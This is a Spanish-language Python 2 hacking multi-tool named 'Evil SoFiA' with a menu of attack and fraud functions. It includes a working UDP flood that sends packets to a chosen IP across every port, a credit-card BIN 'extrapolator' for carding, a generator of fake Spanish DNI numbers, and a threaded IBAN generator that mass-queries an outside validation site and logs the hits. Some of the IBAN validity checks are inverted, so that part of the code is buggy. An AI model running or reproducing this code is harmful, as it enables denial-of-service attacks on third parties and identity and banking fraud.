#Evil SoFiA 
import re
import time 
from random import choice
import sys

vrs = ' 1.9.1'
time.sleep(0.5)
import os

hostname = "www.google.com"
response = os.system("ping -f " + hostname)
if response == 0:
    print "Hay conexion suficiente uwu"
else:
    print "No hay conexion suficiente unu"
    exit()
ax = os.system 
ax("cls")
ax("color 4 ")
ols = time.strftime("%H:%M:%S")
print time.strftime("                     %I:%M:%S") 
if ols > "23:30":
    print "EVIL SOFIA SE ESTA ACTUALIZANDO!..."
    exit()
else:
    print " "

print '''
    ___ _   _  _ _      __   __  ___ _  __   
   | __| \ / || | |   /' _/ /__\| __| |/  \  
   | _|`\ V /'| | |_  `._`.| \/ | _|| | /\ | 
   |___| \_/  |_|___| |___/ \__/|_| |_|_||_|  
'''
time.sleep(1.4)
ax("title EVIL SOFIA")
print "         Emmanuel Milos" + "|" + "Emilio Barroso"
print "         ~EXTRAPOLADOR Y GENERADOR SOFIA~" 
print '''
  
'''

while True:
    print("      .:MENU:.")
    print("   1.EXTRAPOLADOR")
    print("   2.GENERADOR DE DNI")
    print("   3.ATAQUE DDOS")
    print("   4.IBAN GEN/CHECK[BETA][INESTABLE]")
    print("   5.Salir")
    print("")
    opc = input("  Digite el numero de la opcion: ")


    if opc == 1:
        Bin = int(input("Digite los primeros 8 digitos del Bin: "))
        lista = []
        Intro = lista.append(Bin)

        #Primer Bin
        bin11 = int(input("Introduce el digito numero DIEZ del primer Bin: "))
        if bin11 >= 0 and bin11 <= 9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin11 = int(input("Vuelve a introducir el digito: "))

        bin12 = int(input("Introduce el digito numero ONCE del primer Bin: "))
        if bin12 >= 0 and bin12 <= 9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin12 = int(input("Introduce el digito numero ONCE del primer Bin: "))

        #Segundo Bin

        bin21 = int(input("Introduce el digito numero DIEZ del segundo Bin: "))
        if bin21 >= 0 and bin21 <=9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin21 = int(input("Vuelve a introducir el digito: "))

        bin22 = int(input("Introduce el digito numero ONCE del segundo Bin: "))
        if bin22 >= 0 and bin22 <=9:
            print("")
        else:
            print("Introduce un numero correcto :)")
            bin22 = int(input("Introduce el digiro numero ONCE del segundo Bin: "))

        #Algoritmo

        A = int(bin11 + bin21 / 2) * 5
        B = int(bin12 + bin22 / 2) * 5
        C = A + B

        #Agregar los digitos

        Intro2 = lista.append(C)
        print("Tu extrapolacion es: ")
        time.sleep(0.8)
        print("".join(repr(e) for e in lista))
        print("")
        time.sleep(2)

    elif opc==2:
        #LAST DNI GEN
        import time
        
        from random import randint
        os.system("title LAST")
        os.system("cls")
        os.system("color 4")
        print time.strftime("               %I:%M:%S")
        print'''
    
$$\        $$$$$$\   $$$$$$\ $$$$$$$$\ 
$$ |      $$  __$$\ $$  __$$\\__$$  __|
$$ |      $$ /  $$ |$$ /  \__|  $$ |   
$$ |      $$$$$$$$ |\$$$$$$\    $$ |   
$$ |      $$  __$$ | \____$$\   $$ |   
$$ |      $$ |  $$ |$$\   $$ |  $$ |   
$$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |   
\________|\__|  \__| \______/   \__|   
                                       
                                                                 
            '''
        dni=range(1,9)
        print("   Emmanuel Milos|Emilio Barroso")

        i=0

        while i<len(dni):
            for elento in dni:
               dni[i]=randint(1,9)
            i+=1


    
        dni2=x=''.join(map(str,dni))

        print ' '
        time.sleep(2)
        print ("          Generando DNI...")
        time.sleep(3)
        print '''

        '''
        def ra():
            numero = dni2

            intnumero = int(numero)

            letra1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

            resto = intnumero%23

            letra = letra1[resto]
            print '   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%'
            print '   %        ' + numero,  "-", letra + '       %'
            print'   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%'
            print " "

        ra()

        raw_input("Presiona Enter Para Salir De El Gen")
        os.system("color 0")
    elif opc==3: 
        import socket
        import random
        from datetime import datetime
        now = datetime.now()
        hour = now.hour
        minute = now.minute
        day = now.day
        month = now.month
        year = now.year

        ##############
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        #############

        os.system("cls")
        print '''

 _  _  _  __    _ ______ _  __   
| \| \/ \(_    |_| |  | |_|/  |/ 
|_/|_/\_/__)   | | |  | | |\__|\ 

                                                              
        '''
        ip = raw_input("IP Target : ")
        port = input("Port       : ")

        os.system("cls")
        os.system("echo INICIANDO ATAQUE! ")
        print "[                    ] 0% "
        time.sleep(5)
        print "[=====               ] 25%"
        time.sleep(5)
        print "[==========          ] 50%"
        time.sleep(5)
        print "[===============     ] 75%"
        time.sleep(5)
        print "[====================] 100%"
        time.sleep(3)
        sent = 0
        while True:
             sock.sendto(bytes, (ip,port))
             sent = sent + 1
             port = port + 1
             print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
             if port == 65534:
                port = 1
                break;
    elif opc==4:
        from random import *
        import random
        import time
        import requests
        import string
        import thread

        logs1 = '''
         ___ ____    _    _   _        ____ _____ _   _ 
        |_ _| __ )  / \  | \ | |      / ___| ____| \ | |
        || ||  _ \ / _ \ |  \| |_____| |  _|  _| |  \| |
        || || |_) / ___ \| |\  |_____| |_| | |___| |\  |
        |___|____/_/   \_\_| \_|      \____|_____|_| \_|                                               
        \n[$] BOG IBAN GEN/VALIDATOR.
        [$] https://www.Bogpro.com/
        '''

        print logs1
        print '[X] ESCOGE EL PAIS [GERMANY[DE]/FRANCE[FR]/SPAIN[ES]/ITALIA[IT]].'
        print ''

        iban_co = raw_input('[X] ENTER YOUR IBAN COUNTRY NAME OR CODE X> ')
        if str(iban_co) == 'DE' or str(iban_co) == 'GERMANY':
            # //DE IBAN
            def de_chk(a, ab):
                de_iban = 'DE'+str(random.randint(00,99))+'50010517'+str(random.randint(0000000000,9999999999))
                chk_req = requests.post('https://check-iban.com/proxy.php?iban='+de_iban)
                if 'Diese IBAN ist nicht korrekt.' in chk_req.content:
                    print '[-] INVALID GERMANY IBAN [ '+de_iban+' ].'
                    pass
                elif 'Diese IBAN ist formal korrekt.' in chk_req.content:
                    print '[+] VALID GERMANY IBAN [ '+de_iban+' ].'
                    with open('VALID_DE.txt','a+') as f:
                        f.write('[+] VALID GERMANY IBAN [ '+de_iban+' ].')
                        f.close()
                else:
                    print '[%] UNKNOWN GERMANY IBAN [ '+de_iban+' ].'
            while 1:
                thread.start_new_thread(de_chk, ('logs1', 10))
                time.sleep(0.25)

        elif str(iban_co) == 'FR' or str(iban_co) == 'FRANCE':
            # //FR IBAN
            def fr_chk(a, ab):
                fr_iban = 'FR'+str(random.randint(00,99))+'30066'+str(random.randint(000000000000000000,999999999999999999))
                chk_req = requests.post('https://check-iban.com/proxy.php?iban='+fr_iban)
                if 'This is a valid IBAN.' in chk_req.content:
                    print '[-] INVALID FRANCE IBAN [ '+fr_iban+' ].'
                    pass
                else:
                    print '[+] VALID FRANCE IBAN [ '+fr_iban+' ].'
                    with open('VALID_FR.txt','a+') as f:
                        f.write('[+] VALID FRANCE IBAN [ '+fr_iban+' ].')
                        f.close()
            while 1:
                thread.start_new_thread(fr_chk, ('logs1', 10))
                time.sleep(0.25)

        elif str(iban_co) == 'ES' or str(iban_co) == 'SPAIN':
            # //ES IBAN
            def es_chk(a, ab):
                es_iban = 'ES'+str(random.randint(0000000000000000000000,9999999999999999999999))
                chk_req = requests.post('https://check-iban.com/proxy.php?iban='+es_iban)
                if 'This is a valid IBAN.' in chk_req.content:
                    print '[+] VALID SPAIN IBAN [ '+es_iban+' ].'
                    with open('VALID_ES.txt','a+') as f:
                        f.write('[+] VALID SPAIN IBAN [ '+es_iban+' ].')
                        f.close()
                else:
                    print '[-] INVALID SPAIN IBAN [ '+es_iban+' ].'
                    pass
            while 1:
                thread.start_new_thread(es_chk, ('logs1', 10))
                time.sleep(0.25)

        elif str(iban_co) == 'IT' or str(iban_co) == 'ITALY':
            # //IT IBAN
            def it_chk(a, ab):
                it_iban = 'IT'+str(random.randint(00,99))+''.join(random.choice(string.ascii_uppercase) for _ in range(1))+'0300203280'+str(random.randint(000000000000,999999999999))
                chk_req = requests.post('https://check-iban.com/proxy.php?iban='+it_iban)
                if 'This is a valid IBAN.' in chk_req.content:
                    print '[-] VALID ITALY IBAN [ '+it_iban+' ].'
                    with open('VALID_IT.txt','a+') as f:
                        f.write('[+] VALID ITALY IBAN [ '+it_iban+' ].')
                        f.close()
                else:
                    print '[+] INVALID ITALY IBAN [ '+it_iban+' ].'
                    pass
            while 1:
                thread.start_new_thread(it_chk, ('logs1', 10))
                time.sleep(0.25)    
        else:
            # //OUT PUT
            print '[*]  PORFAVOR ESCRIBE UN PAIS O CODIGO DE PAIS VALIDO.'
    elif opc==5:
        print ("Gracias por Utlizar SoFiA")
        break;
        exit()
